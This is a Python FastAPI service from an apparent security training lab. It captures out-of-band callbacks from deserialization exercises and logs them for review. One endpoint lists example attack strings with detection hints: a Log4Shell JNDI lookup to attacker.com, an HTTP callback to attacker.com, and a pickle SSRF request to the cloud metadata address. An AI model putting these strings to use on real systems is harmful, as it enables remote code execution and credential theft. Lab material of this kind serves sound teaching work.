"""
DEHYDRATE Callback Simulator
==========================
Tracks lab execution events and simulates out-of-band callback channels
used in real deserialization exploits (DNS callbacks, HTTP burp collaborator-style).
LAB ENVIRONMENT ONLY — NOT FOR PRODUCTION USE

In real attacks, deserialization gadget chains often trigger:
  - DNS lookups (via JNDI, URL class loading)
  - HTTP callbacks (to attacker's collaborator server)
  - SSRF (Server-Side Request Forgery via deserialization)

This simulator provides a safe, contained endpoint for capturing these
callbacks during lab exercises without requiring external infrastructure.
"""
import uuid
import json
from datetime import datetime, timezone
from typing import List, Optional
from pathlib import Path
from fastapi import FastAPI, HTTPException, Request
from pydantic import BaseModel

app = FastAPI(
    title="DEHYDRATE Callback Simulator",
    description="Lab event tracker and callback receiver — LAB USE ONLY",
    version="1.0.0",
)

# In-memory event store (bounded to 200 entries)
events: List[dict] = []
MAX_EVENTS = 200
EVENTS_DIR = Path("/app/events")

LAB_MARKER = "DEHYDRATE_CALLBACK_CONFIRMED"

# ── Models ────────────────────────────────────────────────────────────────────

class CallbackEvent(BaseModel):
    source_lab: str
    event_type: str       # "payload_sent", "deserialization_triggered", "command_executed", "dns_lookup", "http_callback"
    callback_id: str
    stage: str            # "pre", "during", "post"
    data: dict = {}

class PingRequest(BaseModel):
    callback_id: str
    source: Optional[str] = "unknown"
    payload_type: Optional[str] = "unknown"

# ── Helpers ───────────────────────────────────────────────────────────────────

def _persist_event(entry: dict) -> None:
    """Persist event to /app/events/ volume for post-lab review."""
    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        path = EVENTS_DIR / f"{entry['id']}.json"
        path.write_text(json.dumps(entry, indent=2))
    except Exception:
        pass  # Storage failure is non-fatal

def _add_event(entry: dict) -> None:
    events.append(entry)
    if len(events) > MAX_EVENTS:
        events.pop(0)
    _persist_event(entry)

# ── Endpoints ─────────────────────────────────────────────────────────────────

@app.get("/health")
def health():
    return {
        "status": "running",
        "lab": "callback-simulator",
        "event_count": len(events),
        "version": "1.0.0",
    }

@app.post("/callback")
def receive_callback(event: CallbackEvent):
    """Primary endpoint: labs POST here when an attack stage fires."""
    entry = {
        "id": str(uuid.uuid4()),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_lab": event.source_lab,
        "event_type": event.event_type,
        "callback_id": event.callback_id,
        "stage": event.stage,
        "data": event.data,
    }
    _add_event(entry)
    return {"status": "received", "event_id": entry["id"], "lab_marker": LAB_MARKER}

@app.post("/ping/{callback_id}")
async def receive_ping(callback_id: str, request: Request):
    """
    Lightweight ping endpoint — simulates an out-of-band DNS/HTTP callback.
    Used to confirm that a deserialization payload triggered a network call.
    """
    body = b""
    try:
        body = await request.body()
    except Exception:
        pass

    entry = {
        "id": str(uuid.uuid4()),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_lab": request.headers.get("X-Lab-Source", "unknown"),
        "event_type": "ping",
        "callback_id": callback_id,
        "stage": "trigger",
        "data": {
            "remote_addr": request.client.host if request.client else "unknown",
            "user_agent": request.headers.get("user-agent", ""),
            "body_size": len(body),
            "headers": dict(request.headers),
        },
    }
    _add_event(entry)
    return {"status": "ping_received", "callback_id": callback_id, "lab_marker": LAB_MARKER}

@app.get("/events")
def get_events(limit: int = 50, source_lab: Optional[str] = None, event_type: Optional[str] = None):
    """Return captured events, newest first, with optional filters."""
    filtered = list(reversed(events))
    if source_lab:
        filtered = [e for e in filtered if e["source_lab"] == source_lab]
    if event_type:
        filtered = [e for e in filtered if e["event_type"] == event_type]
    return {
        "events": filtered[:limit],
        "total": len(filtered),
        "lab_marker": LAB_MARKER,
    }

@app.get("/events/{event_id}")
def get_event(event_id: str):
    """Retrieve a single event by ID."""
    for event in events:
        if event["id"] == event_id:
            return event
    raise HTTPException(status_code=404, detail="Event not found")

@app.delete("/events")
def clear_events():
    """Clear all in-memory events (persisted files remain in the volume)."""
    count = len(events)
    events.clear()
    return {"status": "cleared", "events_cleared": count}

@app.get("/stats")
def stats():
    """Aggregate statistics on captured events."""
    by_lab: dict = {}
    by_type: dict = {}
    for e in events:
        by_lab[e["source_lab"]] = by_lab.get(e["source_lab"], 0) + 1
        by_type[e["event_type"]] = by_type.get(e["event_type"], 0) + 1

    return {
        "total_events": len(events),
        "by_source_lab": by_lab,
        "by_event_type": by_type,
        "lab_marker": LAB_MARKER,
    }

@app.get("/attack-channels")
def attack_channels():
    """Describes out-of-band callback channels used in real deserialization exploits."""
    return {
        "channels": [
            {
                "name": "DNS Callback (JNDI)",
                "description": "Java JNDI lookup triggers DNS resolution to attacker domain (Log4Shell pattern)",
                "example": "${jndi:ldap://attacker.com/exploit}",
                "detection": "DNS query from server to external domain",
                "cve_example": "CVE-2021-44228 (Log4Shell)",
            },
            {
                "name": "HTTP Collaborator",
                "description": "Gadget chain triggers HTTP GET to attacker endpoint confirming execution",
                "example": "new URL('http://attacker.com/cb').openStream()",
                "detection": "Unexpected outbound HTTP from application server",
                "cve_example": "Various — used in PoC verification",
            },
            {
                "name": "SSRF via Deserialization",
                "description": "Deserialization payload forces server to make requests to internal services",
                "example": "Pickle payload with urllib.request.urlopen('http://169.254.169.254/...')",
                "detection": "Internal network requests from app server process",
                "cve_example": "Multiple cloud SSRF chains",
            },
            {
                "name": "DNS Rebinding",
                "description": "Attacker hostname resolves to public IP for auth, then rebinds to internal IP",
                "example": "CORS/SOP bypass combined with deserialization to reach internal APIs",
                "detection": "Short TTL DNS responses changing between resolutions",
                "cve_example": "Theoretical — used in combined attack chains",
            },
        ],
        "lab_marker": LAB_MARKER,
    }
